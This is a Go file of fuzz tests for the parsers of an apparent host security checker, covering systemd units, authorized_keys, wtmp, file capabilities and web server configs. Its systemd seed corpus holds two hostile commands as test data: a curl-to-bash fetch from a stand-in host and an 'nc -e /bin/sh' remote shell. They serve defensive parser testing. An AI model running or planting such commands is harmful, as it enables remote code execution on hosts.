package checks

import (
	"regexp"
	"slices"
	"strings"
	"testing"
)

// The parsers below read files that users or attackers on the host can
// write. Whatever they hold, the checks must not crash, because a crash loses
// that check's findings.

// FuzzUnitExec runs a unit file through the steps a persistence check takes.
// Users write their own units in ~/.config/systemd/user.
func FuzzUnitExec(f *testing.F) {
	for _, s := range []string{
		"[Service]\nExecStart=/bin/sh -c \"curl -fsSL http://x.example/a | bash\"\n",
		"ExecStartPre=-@/bin/a \"/bin/a\" b \\\n  c\nExecStart=\n",
		`ExecStart=/\x74mp/a ; /bin/b \; '%h/x'`,
		`ExecStart=/bin/a \777 \UFFFFFFFF \x \`,
		"ExecStart=\"unterminated\nExecStop=+!!/usr/bin/env -u X sudo -u bob bash -c 'nc -e /bin/sh 1 2'",
		"Environment=A=1 \"B=2 3\"\nEnvironmentFile=-/etc/default/x\n",
	} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, src string) {
		u := parseUnit(src)
		for _, e := range u.execs {
			matchExec(e.raw)
			for _, c := range parseExecValue(expandSpecifiers(e.raw, "/home/u")) {
				if len(c.words) == 0 || c.words[0] == "" {
					t.Fatalf("command with no program from %q", e.raw)
				}
				c.text()
				execTargets(c.words, 0)
			}
		}
	})
}

// escapeMount escapes a path the way the kernel writes it in mountinfo.
func escapeMount(s string) string {
	return strings.NewReplacer(`\`, `\134`, " ", `\040`, "\t", `\011`, "\n", `\012`).Replace(s)
}

// FuzzUnescapeMount checks that any mount point, which a user can choose for
// a FUSE mount, comes back unchanged from its mountinfo form.
func FuzzUnescapeMount(f *testing.F) {
	for _, s := range []string{"/", "/mnt/a b", `/mnt/\040`, "/mnt/\t\n", `\134`, `\\134`} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, path string) {
		if got := unescapeMount(escapeMount(path)); got != path {
			t.Fatalf("round trip of %q gave %q", path, got)
		}
	})
}

// FuzzAuthorizedKey parses a line of a user's authorized_keys.
func FuzzAuthorizedKey(f *testing.F) {
	for _, s := range []string{
		"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl user@host",
		`command="echo \"a b\"",no-pty ssh-rsa AAAAB3 c`,
		`"ssh-rsa x`,
		"# ssh-rsa x",
		"sk-ssh-ed25519@openssh.com",
	} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, line string) {
		_, keyType, blob, _, ok := parseAuthorizedKey(line)
		if !ok {
			return
		}
		if !isKeyType(keyType) || blob == "" || strings.ContainsAny(keyType+blob, " \t") {
			t.Fatalf("parseAuthorizedKey(%q) gave type %q and key %q", line, keyType, blob)
		}
		fingerprint(blob)
	})
}

// FuzzParseUtmp parses wtmp records. The file is writable by the utmp group.
func FuzzParseUtmp(f *testing.F) {
	rec := make([]byte, utmpSize)
	rec[0] = utUserProc
	copy(rec[utOffUser:], "root")
	f.Add(rec)
	f.Add(append(rec, 1, 2, 3))
	f.Add([]byte{})
	f.Fuzz(func(t *testing.T, data []byte) {
		if n := len(parseUtmp(data)); n > len(data)/utmpSize {
			t.Fatalf("%d records from %d bytes", n, len(data))
		}
	})
}

// FuzzParseFileCaps decodes security.capability values.
func FuzzParseFileCaps(f *testing.F) {
	f.Add([]byte{0, 0, 0, 2, 0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
	f.Add([]byte{1, 0, 0, 3, 0xff, 0xff, 0xff, 0xff, 0, 0, 0, 0, 0xff, 0xff, 0xff, 0xff, 0, 0, 0, 0, 0, 0, 0, 0})
	f.Add([]byte{0, 0, 0})
	f.Fuzz(func(t *testing.T, b []byte) {
		dangerous, any := parseFileCaps(b)
		if len(dangerous) > 0 && !any {
			t.Fatalf("dangerous capabilities %v but none set", dangerous)
		}
		if !slices.IsSorted(dangerous) {
			t.Fatalf("not sorted: %v", dangerous)
		}
	})
}

// FuzzParseNginx tokenizes nginx configuration.
func FuzzParseNginx(f *testing.F) {
	for _, s := range []string{
		"http { server_tokens off; server { root /var/www/html; include /etc/nginx/sites/*; autoindex on; } }",
		`location ~ "\.php$" { fastcgi_pass 'unix:/run/php.sock'; } # comment`,
		"server { root \"unterminated",
		"}}}{{{;;;",
		`set $a "\"";`,
	} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, src string) {
		parseNginxTokens(src)
	})
}

// FuzzStackVersion feeds the version, image and container parsers what a
// container's metadata or a package database may hold. Every version that
// comes back must be plain dotted numbers, which the end of life lookup and
// fleet queries rely on.
func FuzzStackVersion(f *testing.F) {
	for _, s := range []string{
		"1:10.11.6+maria~ubu2204", "jdk8u392-b08", "1.8.0_392", "v20.11.1", "go1.22.0",
		"localhost:5000/team/redis:7.2.4-alpine@sha256:00", "library/postgres:11", ":", "@", "9:",
	} {
		f.Add(s, "PG_VERSION="+s)
	}
	valid := regexp.MustCompile(`^\d+(\.\d+){0,3}$`)
	f.Fuzz(func(t *testing.T, s, env string) {
		if v := stackVersion(s); v != "" && !valid.MatchString(v) {
			t.Fatalf("stackVersion(%q) = %q", s, v)
		}
		repo, _ := imageRef(s)
		if strings.Contains(repo, "@") {
			t.Fatalf("imageRef(%q) kept a digest in %q", s, repo)
		}
		for id, v := range containerProducts(s, strings.Split(env, "\n")) {
			if stackByID[id] == nil {
				t.Fatalf("containerProducts(%q) named unknown product %q", s, id)
			}
			if v != "" && !valid.MatchString(v) {
				t.Fatalf("containerProducts(%q) gave version %q", s, v)
			}
		}
	})
}

// FuzzParseCaddyfile reads a Caddyfile, including heredocs and snippets.
func FuzzParseCaddyfile(f *testing.F) {
	for _, s := range []string{
		"{\n\tadmin 0.0.0.0:2019\n}\nexample.com {\n\troot * /srv\n\tfile_server browse\n\timport sites/*\n}\n",
		"(snip) {\n\trespond <<EOF\n\t}\n\tEOF 200\n}\n",
		"a {\n\tb {\n",
		"respond <<\n",
		"}\n}\n{",
	} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, src string) {
		parseCaddyfile(src)
	})
}
